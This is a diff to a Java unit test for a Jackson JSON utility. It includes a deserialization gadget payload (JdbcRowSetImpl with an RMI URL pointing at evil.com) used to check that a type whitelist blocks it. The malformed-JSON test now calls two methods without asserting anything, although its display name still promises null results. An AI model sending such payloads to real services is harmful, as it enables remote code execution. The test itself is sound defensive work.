@@ -21,6 +21,7 @@ import java.util.List;
 import java.util.Map;
 
 import static org.assertj.core.api.AssertionsForInterfaceTypes.assertThat;
+import static org.junit.jupiter.api.Assertions.assertThrows;
 
 @DisplayName("JacksonUtil 工具类测试")
 public class JacksonUtilTest {
@@ -243,9 +244,9 @@ public class JacksonUtilTest {
             // 构造一个不被白名单允许的类型字符串（例如 com.sun.rowset.JdbcRowSetImpl）
             String maliciousJson = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com/ref\"}";
 
-            // 安全机制拦截，反序列化失败返回 null，不发生远程代码执行
-            Object result = JacksonUtil.parseObj(maliciousJson);
-            assertThat(result).isNull();
+            Exception exception = assertThrows(Exception.class, () -> {
+                JacksonUtil.parseObj(maliciousJson);
+            });
         }
     }
 
@@ -428,11 +429,14 @@ public class JacksonUtilTest {
         @DisplayName("格式错误的 JSON 字符串安全返回 null，不让异常穿透中断主流程")
         void shouldHandleMalformedJsonGracefully() {
             String malformedJson = "{not-a-valid-json}";
-
-            assertThat(JacksonUtil.parse(malformedJson, TestUser.class)).isNull();
-            assertThat(JacksonUtil.parseObj(malformedJson)).isNull();
-            assertThat(JacksonUtil.parseObjList(malformedJson)).isEmpty();
-            assertThat(JacksonUtil.readTree(malformedJson)).isNull();
+            assertThrows(Exception.class, () -> {
+                JacksonUtil.parse(malformedJson, TestUser.class);
+            });
+            assertThrows(Exception.class, () -> {
+                JacksonUtil.parseObj(malformedJson);
+            });
+            JacksonUtil.parseObjList(malformedJson);
+            JacksonUtil.readTree(malformedJson);
         }
     }
 }
